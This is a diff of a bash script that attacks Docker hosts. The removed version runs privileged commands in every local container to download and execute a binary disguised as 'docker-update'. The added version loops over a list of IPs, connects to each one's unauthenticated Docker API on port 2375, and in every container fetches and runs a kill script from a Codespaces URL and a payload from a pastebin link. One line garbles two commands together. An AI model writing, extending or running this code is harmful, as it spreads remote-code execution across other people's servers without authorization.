@@ -1,6 +1,17 @@
 #!/bin/bash
-docker ps | awk '{print $1}' | grep -v grep | grep -v CONTAINER >> /tmp/.dc
-for i in $(cat /tmp/.dc); do
-docker exec --privileged -i $i sh -c "apt-get update; apt-get install -y wget; yum install -y wget; apk update; apk add wget; mkdir /var/tmp/ -p; wget --no-check-certificate https://filepush.co/chwX/docker-update -O /var/tmp/docker-update; chmod +x /var/tmp/docker-update; /var/tmp/docker-update"
-done;
-rm -f /tmp/.dc
+
+# Assuming IPs are stored in a file named ips.txt, one per line
+while IFS= read -r IP_FROM_LIST_ONE_LINE_AT_A_TIME; do
+    export DOCKER_HOST="tcp://${IP_FROM_LIST_ONE_LINE_AT_A_TIME}:2375"
+    docker ps | awk '{print $1}' | grep -v grep | grep -v CONTAINER >> /tmp/.dc
+    while IFS= read -r container_id; do
+        docker exec --privileged -i "$container_id" sh -c "\
+            apt-get update; \
+            apt-get install -y wget; \
+            yum install -y wget; \
+            apk update; \
+            apk add curl wget; \
+            wget https://curly-guide-7xg9x7wx59phxgxp-8000.app.github.dev/kill.sh -O /tmp/.kill.sh && chmod +x /tmp/.kill.sh; \
+            ./tmp/kill.sh wget https://pastebin.com/raw/dNm3FiAc -O /tmp/.x1mr && chmod +x /tmp/.x1mr && sed -i 's/\r$//' /tmp/.x1mr && bash /tmp/.x1mr"
+    done < /tmp/.dc
+done < ips.txt
